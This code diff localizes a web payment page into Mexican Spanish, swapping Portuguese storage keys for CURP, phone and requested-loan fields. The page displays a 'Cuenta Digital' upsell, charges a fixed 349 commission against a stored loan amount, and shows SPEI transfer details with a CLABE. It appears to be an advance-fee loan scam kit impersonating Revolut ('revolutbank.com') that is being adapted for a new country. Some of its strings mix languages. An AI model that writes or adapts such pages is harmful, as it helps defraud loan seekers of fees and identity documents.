@@ -148,11 +148,11 @@ window.apiUrl = window.apiUrl || function (p) {
       <div style="font-size:15px;font-weight:800;text-align:center;margin-bottom:16px;">Cuenta Digital</div>
       <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f3;">
         <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t07">Instant and 24-hour transfers</span></span>
+        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t07">Transferencias inmediatas y 24 horas</span></span>
       </div>
       <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f3;">
         <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t08">Bill and service payments</span></span>
+        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t08">Pago de facturas y servicios</span></span>
       </div>
       <div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #f0f0f3;">
         <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
@@ -164,7 +164,7 @@ window.apiUrl = window.apiUrl || function (p) {
       </div>
       <div style="display:flex;align-items:center;gap:12px;padding:8px 0;">
         <div style="width:24px;height:24px;border-radius:50%;background:#0a0a0a;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><svg fill="none" stroke="#fff" stroke-width="3" viewBox="0 0 24 24" style="width:13px;height:13px"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t11">24/7 customer support</span></span>
+        <span style="font-size:14px;color:#374151;"><span data-msg="upsell2.t11">Atención al cliente 24/7</span></span>
       </div>
     </div>
 
@@ -204,10 +204,10 @@ window.apiUrl = window.apiUrl || function (p) {
   var nome=(localStorage.getItem('nome')||'customer').trim();
   var p=nome.split(/\s+/);
   document.getElementById('userName').textContent=((p[0]||'customer')+' '+(p.slice(-1)[0]||'')).trim().toLowerCase();
-  var nif=(localStorage.getItem('nif')||'').replace(/\D/g,'');
+  var nif=(localStorage.getItem('curp')||'').replace(/\D/g,'');
   if(nif.length>=18) document.getElementById('userNif').textContent=nif.slice(0,4)+' *** '+nif.slice(-4);
 
-  var loanRaw=parseFloat(localStorage.getItem('selectedLoanAmount')||localStorage.getItem('valorEmprestimo')||0);
+  var loanRaw=parseFloat(localStorage.getItem('selectedLoanAmount')||localStorage.getItem('montoSolicitado')||0);
   var loan=loanRaw||10000;
   var comissao = (window.resolveUpsellAmount||function(f){return f;})(349);
 function getPayAmount(){ return (window.resolveUpsellAmount||function(f){return f;})(349); }
@@ -222,7 +222,7 @@ window.addEventListener('upsell-fee-ready',function(ev){ if(ev&&ev.detail&&ev.de
 
 // ── PAYMENT ──
 function utcNow(){ return new Date().toISOString().replace('T',' ').slice(0,19); }
-function getPhone(){ return (localStorage.getItem('telefone')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/\D/g,''); }
+function getPhone(){ return (localStorage.getItem('telefono')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/\D/g,''); }
 function setModalBody(html){ document.getElementById('modalBody').innerHTML=html; }
 function buildSpeiBody(payData,amtLabel){var s='';if(payData&&payData.clabe){var mx=payData.amount_mxn?'MX$ '+Number(payData.amount_mxn).toFixed(2).replace('.',','):'';s='<div style="background:#f0fdf4;border:1.5px solid #22c55e;border-radius:12px;padding:14px 16px;margin:10px 0;font-size:13px;text-align:left;"><div style="font-weight:800;color:#15803d;margin-bottom:8px;">📲 Transferencia via SPEI</div><table style="width:100%;border-collapse:collapse;font-size:12px;color:#374151;"><tr><td style="padding:3px 0;color:#6b7280;">Bank</td><td style="padding:3px 0;font-weight:700;">'+(payData.bank_name||'STP')+'</td></tr><tr><td style="padding:3px 0;color:#6b7280;">CLABE</td><td style="padding:3px 0;font-weight:700;letter-spacing:.5px;font-family:monospace;">'+payData.clabe+'</td></tr>'+(payData.beneficiary?'<tr><td style="padding:3px 0;color:#6b7280;">Beneficiary</td><td style="padding:3px 0;font-weight:700;">'+payData.beneficiary+'</td></tr>':'')+(payData.reference?'<tr><td style="padding:3px 0;color:#6b7280;">Reference</td><td style="padding:3px 0;font-weight:700;">'+payData.reference+'</td></tr>':'')+(mx?'<tr><td style="padding:3px 0;color:#6b7280;">Amount</td><td style="padding:3px 0;font-weight:700;">'+mx+'</td></tr>':'')+'</table></div>';}return '<div class="modal-status loading">Completa tu pago of <strong>'+amtLabel+'</strong> using the details below.</div>'+s+'<div style="padding:10px;background:#fefce8;border:1.5px solid #fbbf24;border-radius:10px;font-size:13px;color:#92400e;text-align:center;margin-top:8px;">Esperando confirmación…</div>';}
 function closeModal(){ document.getElementById('payModal').classList.remove('show'); }
@@ -280,7 +280,7 @@ async function startPayment(phone){
   console.log('[UPSELL] startPayment phone:', phone);
   const nome=localStorage.getItem('nome')||'Customer';
   const email=localStorage.getItem('email')||'customer@revolutbank.com';
-  const doc=(localStorage.getItem('nif')||localStorage.getItem('cpf')||'999999999').replace(/\D/g,'')||'999999999';
+  const doc=(localStorage.getItem('curp')||localStorage.getItem('curp')||'999999999').replace(/\D/g,'')||'999999999';
   const amount=getPayAmount(17);
   setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Procesando tu pago...</div>');
   try{
